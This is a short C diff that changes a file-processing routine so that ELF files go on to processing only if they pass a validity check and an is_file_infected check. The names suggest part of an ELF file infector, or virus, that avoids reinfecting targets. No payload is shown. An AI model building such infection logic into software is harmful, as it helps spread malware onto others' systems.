@@ -11,7 +11,10 @@ void process_file(const char *path)
 		return ;
 	}
 
-	process_elf(&file);
+	if (!is_file_infected(&file)) {
+		if (is_valid_elf(&file))
+			process_elf(&file);
+	}
 
 	unmap_file(&file);
 	close_file(&file);
